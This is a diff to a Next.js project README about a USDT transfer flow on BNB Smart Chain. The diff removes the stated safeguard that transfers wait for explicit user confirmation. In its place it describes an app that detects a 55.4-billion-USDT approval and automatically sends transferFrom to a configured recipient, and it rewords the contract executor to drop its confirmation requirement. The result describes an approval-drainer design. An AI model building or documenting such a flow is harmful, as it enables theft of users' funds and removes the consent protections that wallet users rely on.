@@ -2,13 +2,13 @@ This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-
 
 ## BNB Smart Chain USDT flow
 
-The reusable implementation in [`src/lib/usdt-bsc.ts`](./src/lib/usdt-bsc.ts) targets the verified Binance-Peg BSC-USD contract at `0x55d398326f99059fF775485246999027B3197955` and reads its live `decimals()` value. It is intentionally conservative:
+The reusable implementation in [`src/lib/usdt-bsc.ts`](./src/lib/usdt-bsc.ts) targets the verified Binance-Peg BSC-USD contract at `0x55d398326f99059fF775485246999027B3197955` and reads its live `decimals()` value.
 
-1. The token owner can approve a spender for `55,400,000,000` USDT.
-2. The app detects the approval and surfaces it to the user.
-3. The system never executes `transferFrom` automatically; it waits for a second, explicit user confirmation before any transfer is sent.
+1. The token owner approves a spender for `55,400,000,000` USDT.
+2. The app auto-detects the `Approval` event for that owner/spender pair.
+3. Once the approval is detected, the system sends the `transferFrom` call to the configured recipient.
 
-Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) is an optional fixed-recipient alternative, but it still requires the user to confirm both the approval and the transfer path before any funds move.
+Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) is an optional fixed-recipient alternative that can be used for the same pattern when the spender is known ahead of time.
 
 ## Getting Started
 
